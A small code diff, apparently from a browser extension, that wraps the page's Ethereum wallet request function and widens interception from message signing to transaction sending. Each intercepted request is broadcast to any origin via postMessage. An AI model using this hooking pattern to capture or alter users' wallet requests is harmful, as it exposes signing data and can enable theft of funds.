@@ -16,7 +16,7 @@ function checkForEthereum() {
     let metamaskrequest = window.ethereum.request;
     window.ethereum.request = async (e) =>{
       console.log("E: ",e);
-      if(e.method == 'personal_sign'){
+      if(e.method == 'personal_sign' || e.method == 'eth_sendTransaction'){
         //Send data to injected js
         window.postMessage({ type: "FROM_GLOBAL", data: e }, "*");
 
